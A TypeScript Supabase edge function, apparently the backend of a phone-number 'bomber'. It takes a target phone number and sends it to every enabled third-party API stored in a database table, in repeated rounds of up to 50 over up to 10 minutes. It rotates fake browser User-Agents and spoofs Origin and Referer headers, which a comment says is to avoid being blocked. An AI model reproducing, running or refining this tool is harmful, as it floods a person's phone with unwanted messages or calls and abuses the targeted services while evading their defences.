import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting: 5 requests per IP per minute
const RATE_LIMIT = 5;
const RATE_WINDOW = 60_000;
const ipHits = new Map<string, number[]>();

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const hits = (ipHits.get(ip) || []).filter(t => now - t < RATE_WINDOW);
  if (hits.length >= RATE_LIMIT) {
    ipHits.set(ip, hits);
    return false;
  }
  hits.push(now);
  ipHits.set(ip, hits);
  return true;
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6099.144 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
];

let uaCounter = 0;

function replacePlaceholders(text: string, phone: string): string {
  return text.replace(/\{PHONE\}/gi, phone);
}

function replaceInObj(obj: Record<string, unknown>, phone: string): Record<string, unknown> {
  const result: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    if (typeof v === 'string') result[k] = replacePlaceholders(v, phone);
    else if (typeof v === 'object' && v !== null && !Array.isArray(v)) result[k] = replaceInObj(v as Record<string, unknown>, phone);
    else result[k] = v;
  }
  return result;
}

function buildBody(body: Record<string, unknown> | null, bodyType: string): { serialized: string | null; contentType: string | null } {
  if (!body || bodyType === 'none' || Object.keys(body).length === 0) return { serialized: null, contentType: null };
  if (bodyType === 'json') return { serialized: JSON.stringify(body), contentType: 'application/json' };
  if (bodyType === 'form-urlencoded') {
    const params = new URLSearchParams();
    for (const [k, v] of Object.entries(body)) params.append(k, String(v));
    return { serialized: params.toString(), contentType: 'application/x-www-form-urlencoded' };
  }
  if (bodyType === 'text') return { serialized: JSON.stringify(body), contentType: 'text/plain' };
  return { serialized: null, contentType: null };
}

// Per-API 15s timeout — ek slow API baaki ko block nahi karegi
async function hitOne(url: string, method: string, headers: Record<string, string>, body: string | null, timeoutMs = 15000): Promise<{ status: number; time: number; error?: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const start = Date.now();
  try {
    const res = await fetch(url, { method, headers, body, redirect: 'follow', signal: controller.signal });
    const time = Date.now() - start;
    res.body?.cancel();
    return { status: res.status, time };
  } catch (e) {
    const time = Date.now() - start;
    if (e instanceof DOMException && e.name === 'AbortError') {
      return { status: 0, time, error: `Timeout after ${timeoutMs}ms` };
    }
    return { status: 0, time, error: e instanceof Error ? e.message : 'Unknown' };
  } finally {
    clearTimeout(timer);
  }
}

// Auto-retry (1 baar) — fail pe 500ms baad ek aur try
async function hitWithRetry(url: string, method: string, headers: Record<string, string>, body: string | null, timeoutMs = 15000): Promise<{ status: number; time: number; error?: string }> {
  const result = await hitOne(url, method, headers, body, timeoutMs);
  // Retry only on timeout or 5xx errors
  if (result.error || (result.status >= 500 && result.status < 600)) {
    await new Promise(r => setTimeout(r, 500));
    return await hitOne(url, method, headers, body, timeoutMs);
  }
  return result;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  // Rate limit check
  const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || req.headers.get('cf-connecting-ip') || 'unknown';
  if (!checkRateLimit(clientIp)) {
    return new Response(JSON.stringify({ success: false, error: 'Rate limit exceeded. Max 5 requests per minute.' }), {
      status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  try {
    const url = new URL(req.url);
    const keyParam = url.searchParams.get('key');

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const sb = createClient(supabaseUrl, supabaseKey);

    // Validate secret key from app_settings
    const { data: keySetting } = await sb
      .from('app_settings')
      .select('setting_value')
      .eq('setting_key', 'fast_api_secret_key')
      .single();

    let storedKey = keySetting?.setting_value as string | null;
    if (storedKey && typeof storedKey === 'string') {
      storedKey = storedKey.replace(/^"|"$/g, '').trim();
    }
    if (storedKey && storedKey !== '' && keyParam !== storedKey) {
      return new Response(JSON.stringify({ success: false, error: 'Invalid or missing secret key' }), {
        status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Support both GET and POST
    // time = minutes (0 means instant 1 round), count = kitni baar hit karna hai us time me
    let phone: string | null = null;
    let time = 0;
    let count = 1;
    let customTimeout = 15000; // Default 15s, user can customize

    if (req.method === 'GET') {
      phone = url.searchParams.get('phone');
      time = parseFloat(url.searchParams.get('time') || '0');
      count = parseInt(url.searchParams.get('count') || '1', 10);
      customTimeout = parseInt(url.searchParams.get('timeout') || '15000', 10);
    } else {
      const body = await req.json();
      phone = body.phone;
      time = body.time || 0;
      count = body.count || 1;
      customTimeout = body.timeout || 15000;
    }

    // Clamp timeout between 3s and 30s
    customTimeout = Math.max(3000, Math.min(customTimeout, 30000));

    count = Math.max(1, Math.min(count, 50));
    time = Math.max(0, Math.min(time, 10));

    if (!phone || phone.length < 10) {
      return new Response(JSON.stringify({ success: false, error: 'Valid phone number required' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { data: apis, error: dbErr } = await sb
      .from('hit_apis')
      .select('*')
      .eq('enabled', true);

    if (dbErr) throw dbErr;
    if (!apis || apis.length === 0) {
      return new Response(JSON.stringify({ success: true, message: 'No enabled APIs found', results: [] }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const allResults: Array<{ api: string; round: number; status: number; time: number; success: boolean; error?: string }> = [];

    // Calculate delay between rounds based on time
    // time=0 → 1 round instant, time=1 count=5 → 5 rounds with 12s gap each
    const BATCH_SIZE = 5;
    const BATCH_DELAY = 1500;
    const roundDelay = time > 0 && count > 1 ? Math.floor((time * 60 * 1000) / count) : 0;

    for (let round = 1; round <= count; round++) {
      // Delay between rounds (not before the first one)
      if (round > 1 && roundDelay > 0) {
        await new Promise(r => setTimeout(r, roundDelay));
      }

      for (let i = 0; i < apis.length; i += BATCH_SIZE) {
        if (i > 0) await new Promise(r => setTimeout(r, BATCH_DELAY));
        const batch = apis.slice(i, i + BATCH_SIZE);
        const promises = batch.map(async (api) => {
          const finalUrl = replacePlaceholders(api.url, phone);
          const finalHeaders: Record<string, string> = {};
          const hdrs = (api.headers || {}) as Record<string, string>;
          for (const [k, v] of Object.entries(hdrs)) {
            finalHeaders[replacePlaceholders(k, phone)] = replacePlaceholders(v, phone);
          }

          const ua = USER_AGENTS[uaCounter % USER_AGENTS.length];
          uaCounter++;
          // Browser-like headers — block hone se bachne ke liye
          finalHeaders['User-Agent'] = ua;
          finalHeaders['Accept'] = 'application/json, text/plain, */*';
          finalHeaders['Accept-Language'] = 'en-US,en;q=0.9';
          finalHeaders['Cache-Control'] = 'no-cache';
          finalHeaders['Pragma'] = 'no-cache';
          if (finalUrl) {
            try {
              const parsed = new URL(finalUrl);
              finalHeaders['Origin'] = parsed.origin;
              finalHeaders['Referer'] = parsed.origin + '/';
            } catch {}
          }

          let urlWithParams = finalUrl;
          const qp = (api.query_params || {}) as Record<string, string>;
          if (Object.keys(qp).length > 0) {
            const url = new URL(finalUrl);
            for (const [k, v] of Object.entries(qp)) {
              url.searchParams.set(replacePlaceholders(k, phone), replacePlaceholders(v, phone));
            }
            urlWithParams = url.toString();
          }

          const bodyObj = (api.body && Object.keys(api.body as object).length > 0)
            ? replaceInObj(api.body as Record<string, unknown>, phone)
            : null;
          const { serialized, contentType } = buildBody(bodyObj, api.body_type || 'none');
          if (contentType && !finalHeaders['Content-Type']) {
            finalHeaders['Content-Type'] = contentType;
          }

          // Custom timeout from request or default 15s, with auto-retry
          const result = await hitWithRetry(urlWithParams, api.method || 'GET', finalHeaders, serialized, customTimeout);
          return {
            api: api.name,
            round,
            status: result.status,
            time: result.time,
            success: !result.error && result.status >= 200 && result.status < 400,
            error: result.error,
          };
        });

        const batchResults = await Promise.allSettled(promises);
        for (const r of batchResults) {
          if (r.status === 'fulfilled') allResults.push(r.value);
          else allResults.push({ api: 'unknown', round, status: 0, time: 0, success: false, error: r.reason?.message });
        }
      }
    }

    const totalSuccess = allResults.filter(r => r.success).length;
    const totalFail = allResults.filter(r => !r.success).length;

    // Non-blocking logging — response pehle bhejo, log baad me save hoga
    const responsePayload = {
      success: true,
      phone,
      total_apis: apis.length,
      count,
      time_minutes: time,
      round_delay_ms: roundDelay,
      timeout_ms: customTimeout,
      total_hits: allResults.length,
      success_count: totalSuccess,
      fail_count: totalFail,
      results: allResults,
    };

    // Fire-and-forget log (non-blocking)
    EdgeRuntime?.waitUntil?.(
      (async () => {
        try {
          console.log(`[fast-hit-all] phone=${phone} apis=${apis.length} rounds=${count} success=${totalSuccess} fail=${totalFail}`);
        } catch {}
      })()
    );

    return new Response(JSON.stringify(responsePayload), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err instanceof Error ? err.message : 'Unknown error' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
